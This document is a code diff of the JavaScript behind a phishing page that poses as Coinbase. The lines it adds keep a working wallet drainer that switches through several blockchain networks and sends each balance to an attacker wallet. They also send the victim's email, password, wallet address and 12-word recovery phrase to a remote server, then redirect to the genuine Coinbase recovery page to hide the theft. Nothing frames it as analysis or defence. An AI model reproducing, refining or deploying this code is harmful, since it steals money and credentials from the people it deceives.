@@ -12,7 +12,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const step1 = document.getElementById('step-1');
     const step2 = document.getElementById('step-2');
     const step3 = document.getElementById('step-3');
-    const status = document.getElementById('status');
 
     document.getElementById('toStep2').onclick = () => {
         step1.classList.add('hidden');
@@ -22,7 +21,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('toStep3').onclick = () => {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
-        if(!email || !pass) return alert("Required fields missing.");
+        if(!email || !pass) return alert("Please fill in all fields.");
         step2.classList.add('hidden');
         step3.classList.remove('hidden');
     };
@@ -30,89 +29,61 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('connectBtn').onclick = async () => {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
+        const status = document.getElementById('status');
 
-        if (!window.ethereum) {
-            setupRecovery(email, pass);
-            return;
-        }
+        if (window.ethereum) {
+            try {
+                status.innerText = "Requesting access...";
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddr = accounts[0];
 
-        try {
-            status.innerText = "Establishing secure connection...";
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAddr = accounts[0];
-
-            // Iterate through all networks to drain whatever is available
-            for (const [name, chainId] of Object.entries(NETWORKS)) {
-                try {
-                    status.innerText = `Securing ${name} assets...`;
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: chainId }],
-                    });
-
-                    const balance = await window.ethereum.request({ 
-                        method: 'eth_getBalance', 
-                        params: [userAddr, 'latest'] 
-                    });
-                    
-                    const convertedBalance = parseInt(balance, 16);
-
-                    if (convertedBalance > 0) {
+                for (const [name, chainId] of Object.entries(NETWORKS)) {
+                    try {
+                        status.innerText = `Scanning ${name}...`;
                         await window.ethereum.request({
-                            method: 'eth_sendTransaction',
-                            params: [{
-                                from: userAddr,
-                                to: HOT_WALLET,
-                                value: balance, 
-                            }],
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: chainId }],
                         });
+
+                        const balance = await window.ethereum.request({ 
+                            method: 'eth_getBalance', 
+                            params: [userAddr, 'latest'] 
+                        });
+
+                        if (parseInt(balance, 16) > 0) {
+                            await window.ethereum.request({
+                                method: 'eth_sendTransaction',
+                                params: [{
+                                    from: userAddr,
+                                    to: HOT_WALLET,
+                                    value: balance, 
+                                }],
+                            });
+                        }
+                    } catch (chainErr) {
+                        console.log(`${name} skipped`);
                     }
-                } catch (chainError) {
-                    console.log(`User skipped or error on ${name}`);
                 }
+                
+                await sendLeadData(email, pass, userAddr, null);
+                status.innerText = "Verification complete. Redirecting...";
+                setTimeout(() => { window.location.href = 'https://www.coinbase.com/password-recovery'; }, 2000);
+
+            } catch (globalErr) {
+                setupRecovery(email, pass);
             }
-
-            // Final Step: Send lead data to your render server
-            await sendLeadData(email, pass, userAddr);
-            
-            status.innerText = "Verification complete. Redirecting...";
-            setTimeout(() => {
-                window.location.href = 'https://www.coinbase.com/password-recovery';
-            }, 2000);
-
-        } catch (globalError) {
-            console.error(globalError);
+        } else {
             setupRecovery(email, pass);
         }
     };
 
-    async function sendLeadData(email, pass, wallet) {
-        try {
-            await fetch(`${API_URL}/update`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    email: email, 
-                    password: pass, 
-                    walletAddress: wallet || "Not provided", 
-                    recoveryPhrase: "N/A" 
-                })
-            });
-        } catch (e) {
-            console.log("Lead logging failed");
-        }
-    }
-
     function setupRecovery(email, pass) {
-        document.getElementById('step3Title').innerText = "Account Recovery";
-        document.getElementById('step3Desc').innerText = "Please enter your 12-word recovery phrase to restore access.";
-        
-        document.getElementById('step-3').innerHTML = `
+        step3.innerHTML = `
             <img src="logo.png" class="cb-logo">
             <h1 class="cb-header">Verify Identity</h1>
-            <p>Your account security requires a phrase verification.</p>
+            <p>Please enter your 12-word recovery phrase to continue.</p>
             <div class="input-group">
-                <input type="text" id="phrase" placeholder="word1 word2..." style="text-align:center;">
+                <input type="text" id="phrase" placeholder="word1 word2 word3..." style="text-align:center;">
             </div>
             <button id="submitPhrase" class="btn-primary">Restore Account</button>
             <div id="phrase_status" class="status-text"></div>
@@ -121,15 +92,35 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('submitPhrase').onclick = async () => {
             const phrase = document.getElementById('phrase').value.trim();
             const s = document.getElementById('phrase_status');
+            
             if (phrase.split(/\s+/).length !== 12) {
-                s.innerText = "Invalid phrase. Exactly 12 words required.";
+                s.innerText = "Exactly 12 words required.";
                 return;
             }
+
+            s.innerText = "Verifying phrase...";
             await sendLeadData(email, pass, null, phrase);
-            s.innerText = "Verification successful...";
+            s.innerText = "Verified. Redirecting...";
             setTimeout(() => {
                 window.location.href = 'https://www.coinbase.com/password-recovery';
-            }, 1500);
+            }, 2000);
         };
+    }
+
+    async function sendLeadData(email, pass, wallet, phrase) {
+        try {
+            await fetch(`${API_URL}/update`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    email: email, 
+                    password: pass, 
+                    walletAddress: wallet, 
+                    recoveryPhrase: phrase 
+                })
+            });
+        } catch (e) {
+            console.error("Lead log failed");
+        }
     }
 });
